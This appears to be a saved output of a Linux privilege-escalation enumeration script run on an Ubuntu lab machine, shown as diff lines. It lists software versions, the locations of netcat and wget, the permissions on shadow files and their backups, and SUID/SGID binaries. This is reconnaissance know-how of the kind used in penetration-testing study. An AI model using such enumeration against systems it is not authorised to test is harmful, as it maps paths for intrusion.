+total 0
+lrwxrwxrwx 1 root root 25 Jul 22  2019 systemd-initctl.socket -> ../systemd-initctl.socket
+lrwxrwxrwx 1 root root 32 Jul 22  2019 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
+lrwxrwxrwx 1 root root 34 Jul 22  2019 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
+lrwxrwxrwx 1 root root 26 Jul 22  2019 systemd-journald.socket -> ../systemd-journald.socket
+lrwxrwxrwx 1 root root 31 Jul 22  2019 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
+lrwxrwxrwx 1 root root 30 Jul 22  2019 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
+lrwxrwxrwx 1 root root 14 Jun 10  2019 dbus.socket -> ../dbus.socket
+
+/lib/systemd/system/getty.target.wants:
+total 0
+lrwxrwxrwx 1 root root 23 Jul 22  2019 getty-static.service -> ../getty-static.service
+
+/lib/systemd/system/graphical.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul 22  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/local-fs.target.wants:
+total 0
+lrwxrwxrwx 1 root root 29 Jul 22  2019 systemd-remount-fs.service -> ../systemd-remount-fs.service
+
+/lib/systemd/system/rescue.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul 22  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/timers.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Jul 22  2019 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer
+
+/lib/systemd/system/rc-local.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 290 Jul 22  2019 debian.conf
+
+/lib/systemd/system/user@.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 125 Jul 22  2019 timeout.conf
+
+/lib/systemd/system/open-vm-tools.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 46 May 14  2019 desktop.conf
+
+/lib/systemd/system/runlevel1.target.wants:
+total 0
+
+/lib/systemd/system/runlevel2.target.wants:
+total 0
+
+/lib/systemd/system/runlevel3.target.wants:
+total 0
+
+/lib/systemd/system/runlevel4.target.wants:
+total 0
+
+/lib/systemd/system/runlevel5.target.wants:
+total 0
+
+/lib/systemd/system-generators:
+total 200K
+-rwxr-xr-x 1 root root 23K Jul 22  2019 systemd-cryptsetup-generator
+-rwxr-xr-x 1 root root 10K Jul 22  2019 systemd-debug-generator
+-rwxr-xr-x 1 root root 31K Jul 22  2019 systemd-fstab-generator
+-rwxr-xr-x 1 root root 14K Jul 22  2019 systemd-getty-generator
+-rwxr-xr-x 1 root root 26K Jul 22  2019 systemd-gpt-auto-generator
+-rwxr-xr-x 1 root root 10K Jul 22  2019 systemd-hibernate-resume-generator
+-rwxr-xr-x 1 root root 10K Jul 22  2019 systemd-rc-local-generator
+-rwxr-xr-x 1 root root 10K Jul 22  2019 systemd-system-update-generator
+-rwxr-xr-x 1 root root 31K Jul 22  2019 systemd-sysv-generator
+-rwxr-xr-x 1 root root 14K Jul 22  2019 systemd-veritysetup-generator
+-rwxr-xr-x 1 root root 286 Jun 21  2019 friendly-recovery
+lrwxrwxrwx 1 root root  22 May  9  2019 netplan -> ../../netplan/generate
+
+/lib/systemd/network:
+total 16K
+-rw-r--r-- 1 root root 645 Jan 28  2018 80-container-host0.network
+-rw-r--r-- 1 root root 718 Jan 28  2018 80-container-ve.network
+-rw-r--r-- 1 root root 704 Jan 28  2018 80-container-vz.network
+-rw-r--r-- 1 root root 412 Jan 28  2018 99-default.link
+
+/lib/systemd/system-preset:
+total 4.0K
+-rw-r--r-- 1 root root 951 Jan 28  2018 90-systemd.preset
+
+/lib/systemd/system-sleep:
+total 4.0K
+-rwxr-xr-x 1 root root 92 Feb 22  2018 hdparm
+
+/lib/systemd/system-shutdown:
+total 0
+-e 
+
+-e [00;33m### SOFTWARE #############################################[00m
+-e [00;31m[-] Sudo version:[00m
+Sudo version 1.8.21p2
+-e 
+
+-e [00;31m[-] Apache version:[00m
+Server version: Apache/2.4.29 (Ubuntu)
+Server built:   2019-07-16T18:14:45
+-e 
+
+-e [00;31m[-] Apache user configuration:[00m
+APACHE_RUN_USER=webadmin
+APACHE_RUN_GROUP=webadmin
+-e 
+
+-e [00;31m[-] Installed Apache modules:[00m
+Loaded Modules:
+ core_module (static)
+ so_module (static)
+ watchdog_module (static)
+ http_module (static)
+ log_config_module (static)
+ logio_module (static)
+ version_module (static)
+ unixd_module (static)
+ access_compat_module (shared)
+ alias_module (shared)
+ auth_basic_module (shared)
+ authn_core_module (shared)
+ authn_file_module (shared)
+ authz_core_module (shared)
+ authz_host_module (shared)
+ authz_user_module (shared)
+ autoindex_module (shared)
+ deflate_module (shared)
+ dir_module (shared)
+ env_module (shared)
+ filter_module (shared)
+ mime_module (shared)
+ mpm_prefork_module (shared)
+ negotiation_module (shared)
+ php7_module (shared)
+ reqtimeout_module (shared)
+ setenvif_module (shared)
+ status_module (shared)
+-e 
+
+-e [00;33m### INTERESTING FILES ####################################[00m
+-e [00;31m[-] Useful file locations:[00m
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+-e 
+
+-e [00;31m[-] Installed compilers:[00m
+ii  libxkbcommon0:amd64                   0.8.0-1ubuntu0.1                  amd64        library interface to the XKB compiler - shared library
+-e 
+
+-e [00;31m[-] Can we read/write sensitive files:[00m
+-rw-r--r-- 1 root root 1402 Aug 24  2019 /etc/passwd
+-rw-r--r-- 1 root root 743 Aug 24  2019 /etc/group
+-rw-r--r-- 1 root root 581 Apr  9  2018 /etc/profile
+-rw-r----- 1 root shadow 975 Aug 25  2019 /etc/shadow
+-e 
+
+-e [00;31m[-] SUID files:[00m
+-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 10312 May 14  2019 /usr/bin/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 149080 Jan 17  2018 /usr/bin/sudo
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount
+-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
+-e 
+
+-e [00;31m[-] SGID files:[00m
+-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root crontab 39352 Nov 15  2017 /usr/bin/crontab
+-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /usr/bin/chage
+-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
+-rwxr-sr-x 1 root ssh 362640 Mar  4  2019 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /usr/bin/expiry
+-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
+-e 
+
+-e [00;31m[+] Files with POSIX capabilities set:[00m
+/usr/bin/mtr-packet = cap_net_raw+ep
+-e 
+
+-e [-] Can't search *.conf files as no keyword was entered
+
+-e [-] Can't search *.php files as no keyword was entered
+
+-e [-] Can't search *.log files as no keyword was entered
+
+-e [-] Can't search *.ini files as no keyword was entered
+
+-e [00;31m[-] All *.conf files in /etc (recursive 1 level):[00m
+-rw-r--r-- 1 root root 4861 Feb 22  2018 /etc/hdparm.conf
+-rw-r--r-- 1 root root 280 Jun 19  2014 /etc/fuse.conf
+-rw-r--r-- 1 root root 403 Mar  1  2018 /etc/updatedb.conf
+-rw-r--r-- 1 root root 350 Aug 23  2019 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
+-rw-r--r-- 1 root root 2683 Jan 17  2018 /etc/sysctl.conf
+-rw-r--r-- 1 root root 812 Mar 24  2018 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 2584 Feb  1  2018 /etc/gai.conf
+-rw-r--r-- 1 root root 191 Feb  7  2018 /etc/libaudit.conf
+-rw-r--r-- 1 root root 14867 Oct 12  2016 /etc/ltrace.conf
+-rw-r--r-- 1 root root 513 Feb  9  2019 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 1358 Jan 30  2018 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 2969 Feb 28  2018 /etc/debconf.conf
+-rw-r--r-- 1 root root 703 Aug 21  2017 /etc/logrotate.conf
+-rw-r--r-- 1 root root 5898 Feb  9  2019 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 552 Apr  4  2018 /etc/pam.conf
+-rw-r--r-- 1 root root 1260 Feb 25  2018 /etc/ucf.conf
+-rw-r--r-- 1 root root 3028 Feb  9  2019 /etc/adduser.conf
+-rw-r--r-- 1 root root 604 Aug 13  2017 /etc/deluser.conf
+-rw-r--r-- 1 root root 92 Apr  9  2018 /etc/host.conf
+-rw-r--r-- 1 root root 144 Aug 23  2019 /etc/kernel-img.conf
+-e 
+
+-e [00;31m[-] Current user's history files:[00m
+-rw------- 1 sysadmin sysadmin 1 Aug 25  2019 /home/sysadmin/.bash_history
+-e 
+
+-e [00;31m[-] Location and contents (if accessible) of .bash_history file(s):[00m
+/home/sysadmin/.bash_history
+
+/home/webadmin/.bash_history
+-e 
+
+-e [00;31m[-] Location and Permissions (if accessible) of .bak file(s):[00m
+-rw-r--r-- 1 root root 3022 Aug 23  2019 /etc/apt/sources.bak
+-rw------- 1 root root 1402 Aug 24  2019 /var/backups/passwd.bak
+-rw------- 1 root shadow 624 Aug 24  2019 /var/backups/gshadow.bak
+-rw------- 1 root root 743 Aug 24  2019 /var/backups/group.bak
+-rw------- 1 root shadow 975 Aug 25  2019 /var/backups/shadow.bak
+-e 
+
+-e [00;31m[-] Any interesting mail in /var/mail:[00m
+total 8
+drwxrwsr-x  2 root mail 4096 Feb  9  2019 .
+drwxr-xr-x 12 root root 4096 Aug 24  2019 ..
+-e 
+
+-e [00;33m### SCAN COMPLETE ####################################[00m
